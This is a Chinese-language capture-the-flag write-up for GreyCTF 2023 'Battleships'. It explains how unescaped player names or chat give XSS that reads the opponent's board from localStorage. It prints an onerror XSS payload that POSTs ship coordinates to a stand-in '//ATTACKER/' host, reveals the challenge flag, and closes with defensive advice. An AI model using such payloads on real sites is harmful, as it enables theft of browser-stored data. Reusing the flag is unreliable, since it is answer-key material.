# GreyCTF 2023 Battleships

## 题目简述

题目把经典战舰游戏改成联网对战。玩家名称或聊天内容未经安全转义进入前端，形成 XSS；对手浏览器又把完整棋盘对象保存在 `localStorage.board`，其中每个格子的 `hasShip` 与 `coordinates` 直接暴露舰船位置。窃取坐标后即可按完美顺序攻击并取胜。

## 解题过程

向对手会渲染的名称或聊天字段发送无交互载荷。仓库给出的核心读取逻辑为：

```javascript
JSON.parse(localStorage.board).state
  .filter(square => square.hasShip)
  .map(square => square.coordinates)
```

可以把结果序列化后 POST 到自有接收端：

```html
<img src=x onerror="fetch('//ATTACKER/',{
  method:'POST',mode:'no-cors',
  body:JSON.stringify(JSON.parse(localStorage.board).state
    .filter(s=>s.hasShip).map(s=>s.coordinates))
})">
```

对手页面执行脚本后，接收端获得所有含舰格坐标。按坐标逐个调用游戏的攻击操作，不再浪费回合猜测空格；击沉全部舰船后，服务器在 `win` 事件中返回：

```text
grey{th1s_Is_n0T_Ch34t_YOu_JusT_h4ve_Ski11_i5sUe}
```

仓库自带的游戏界面截图和图标只展示外观，不影响 XSS、存储结构或攻击步骤，因此未作为题解图片归档。

## 方法总结

客户端必须知道自己的棋盘，但这也意味着同源 XSS 可以读取全部游戏秘密。防护重点是对玩家可控文本做上下文转义并部署严格 CSP；同时服务端应只向每个客户端发送其确实需要的状态，不能依赖“界面没有显示”保护 localStorage 中的数据。
